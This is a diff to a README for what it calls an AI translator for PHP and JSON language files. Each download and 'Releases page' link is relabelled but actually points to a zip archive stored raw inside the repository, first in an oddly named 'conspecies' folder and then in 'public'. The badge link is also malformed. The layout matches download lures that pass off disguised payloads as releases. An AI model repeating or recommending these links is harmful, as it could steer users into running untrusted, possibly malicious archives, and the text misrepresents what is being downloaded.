@@ -1,6 +1,6 @@
 # 🚀 ai-php-json-files-language-translator - Easy Translation for Your Language Files
 
-[![Download Latest Release](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/conspecies/ai-php-json-files-language-translator.zip%20Latest%https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/conspecies/ai-php-json-files-language-translator.zip)](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/conspecies/ai-php-json-files-language-translator.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/public/ai_json_language_php_files_translator_v1.5.zip%20Latest%https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/public/ai_json_language_php_files_translator_v1.5.zip)](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/public/ai_json_language_php_files_translator_v1.5.zip)
 
 ## 📥 Introduction
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets these requirements:
 ### Installation Steps
 
 1. **Visit the Release Page:**
-   Go to our [Releases page](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/conspecies/ai-php-json-files-language-translator.zip) to access the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/public/ai_json_language_php_files_translator_v1.5.zip) to access the latest version of the software.
 
 2. **Download the Application:**
    Look for the latest version and click on it. You will see several downloadable files. Choose the specific installer file for your operating system.
@@ -55,7 +55,7 @@ To use the translator after installation:
 
 ## 🔗 Download & Install
 
-Ready to start translating? Visit our [Releases page](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/conspecies/ai-php-json-files-language-translator.zip) to download the latest version.
+Ready to start translating? Visit our [Releases page](https://raw.githubusercontent.com/vaibhav7499/ai-php-json-files-language-translator/main/public/ai_json_language_php_files_translator_v1.5.zip) to download the latest version.
 
 ## 📄 Support and Documentation
 
